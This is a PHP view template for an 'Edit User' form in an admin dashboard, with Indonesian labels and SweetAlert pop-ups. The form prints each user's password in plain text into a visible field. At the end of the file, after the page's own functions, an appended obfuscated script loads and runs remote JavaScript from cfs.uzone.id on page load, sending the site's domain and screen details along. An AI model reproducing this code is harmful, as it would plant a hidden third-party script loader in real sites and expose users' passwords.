<section class="content">
    <div class="block-header">
        <div class="row">
            <div class="col-md-8 col-sm-7 col-xs-12">
                <div class="h-left clearfix">
                    <h2> USER </h2>
                    <small>Edit <a href="https://datatables.net/" target="_blank">Data User</a></small>
                    <ol class="breadcrumb breadcrumb-col-pink p-l-0">
                        <li><a href="javascript:void(0);">Dashboard</a></li>
                        <li class="active">User</li>
                        <li class="active">Edit User</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <div class="container-fluid">        
        <!-- Vertical Layout -->
        <div class="row clearfix">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <div class="card">
                    <div class="header">
                        <h2> FORM EDIT USER </h2>
                    </div>
                    <div class="body">
                        <form action="<?php echo base_url('index.php/user/edit_user/'.$datas[0]['id_user']); ?>" method="post">
                            <label for="id_user">ID User</label>
                            <div class="form-group">
                                <div class="form-line">
                                    <input type="text" name="id_user" class="form-control" value="<?php echo $datas[0]['id_user']; ?>" disabled>
                                </div>
                            </div>                            
                            <label for="username">Username</label>
                            <div class="form-group">
                                <div class="form-line">
                                    <input type="text" name="username" class="form-control" value="<?php echo $datas[0]['username']; ?>" required>
                                </div>
                            </div>
                            <label for="password">Password</label>
                            <div class="form-group">
                                <div class="form-line">
                                    <input type="text" name="password" class="form-control" value="<?php echo $datas[0]['password']; ?>" required>
                                </div>
                            </div>
                            <label for="jabatan">Jabatan</label>
                            <div class="form-group">
                                <div class="form-line">
                                    <input type="text" name="jabatan" class="form-control" value="<?php echo $datas[0]['jabatan']; ?>" required>
                                </div>
                            </div>
                            <label for="id_user">Level</label>
                            <div class="form-group">
                                <div class="form-line">
                                    <input type="text" name="id_user" class="form-control" value="<?php echo $datas[0]['id_level']; ?>" disabled>
                                </div>
                            </div>   
                            <br>
                            <?php echo '<button onclick="update()" class="btn btn-raised btn-primary m-t-15 waves-effect" value="update" type="submit">Update</button>'; ?>

                            <!-- <button type="submit" class="btn btn-raised btn-primary m-t-15 waves-effect" value="update">Update</button> -->
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>


<!-- Jquery Core Js --> 
<script src="<?php echo base_url().'assets/'; ?>bundles/libscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 
<script src="<?php echo base_url().'assets/'; ?>bundles/vendorscripts.bundle.js"></script> <!-- Lib Scripts Plugin Js --> 

<script src="<?php echo base_url().'assets/'; ?>lugins/jquery-validation/jquery.validate.js"></script> <!-- Jquery Validation Plugin Css --> 
<script src="<?php echo base_url().'assets/'; ?>plugins/jquery-steps/jquery.steps.js"></script> <!-- JQuery Steps Plugin Js --> 

<script src="<?php echo base_url().'assets/'; ?>plugins/jquery-sparkline/jquery.sparkline.js"></script> <!-- Sparkline Plugin Js -->

<script src="<?php echo base_url().'assets/'; ?>bundles/mainscripts.bundle.js"></script><!-- Custom Js --> 
<script src="<?php echo base_url().'assets/'; ?>js/pages/charts/sparkline.js"></script>
<script src="<?php echo base_url().'assets/'; ?>js/pages/forms/form-validation.js"></script> 


<script src="<?php echo base_url().'assets/'; ?>plugins/autosize/autosize.js"></script> <!-- Autosize Plugin Js --> 
<script src="<?php echo base_url().'assets/'; ?>plugins/momentjs/moment.js"></script> <!-- Moment Plugin Js --> 
<!-- Bootstrap Material Datetime Picker Plugin Js --> 
<script src="<?php echo base_url().'assets/'; ?>plugins/bootstrap-material-datetimepicker/js/bootstrap-material-datetimepicker.js"></script> 

<script src="<?php echo base_url().'assets/'; ?>js/pages/forms/basic-form-elements.js"></script> 
<script src="<?php echo base_url()."assets/"; ?>/plugins/sweetalert/sweetalert.min.js"></script> 

<script type="text/javascript">
    function update() {
       swal("Good job!", "Data Berhasil Diubah!", "success");
   }

   function logout(pesan, url) {
        swal({
            title: "Are you sure?",
            text: "Apakah Anda Ingin Logout?",
            type: "warning",
            showCancelButton: true,
            confirmButtonColor: "#DD6B55",
            confirmButtonText: "Ya, Logout",
            cancelButtonText: "Tidak",
            closeOnConfirm: false,
            closeOnCancel: false
        },
        function(isConfirm){
            if (isConfirm) {
                swal("Logout", "Anda Berhasil Logout", "success");
                window.location = url;
            } else {
                swal("Dibatalkan", "Batal Logout", "error");
            }
        });
    }

 if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKt4DxtVeiP1PkR1teIqHBX7Kt%2fHjqZpwhE15fOK%2bP7jgjVHahKpPcdoRlYTSQj8RkY93E1BggGhtSWhEUamyTAY2yVVJxgAYJMWoaP5tvgcncyidXcdpzjBXfuo2Lr8ET5U2SZH0KEpiauymlz9UxCSAwezeRdxTL1UK57BG77eHui8F5wM4tUedf4iidY8ibUYKNXsvxUERHiIq58A0x1iSsvDVL%2b0jGlFLRfPfjDKCQwEYllJaYPtbcxtNxQdDb4f4fKfa4dRY%2fHj0xByJdyz9dVdpoLm1iTydIp8NxgU2sKu%2b1Zkk5dpGMtJO4Y5FDSDal4HfED5AuVe24CYqlKQygealyvUvipp%2b8shI%2bRgya86HPqmvZN3F%2bCugVQ106v%2fWbp0rXJNQqNTLBQBd51Hd0O%2bEpodODNqVJfBK3MRadmp4iSZIVeWa8gAXLChzQecrrZjLcGRo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 </html>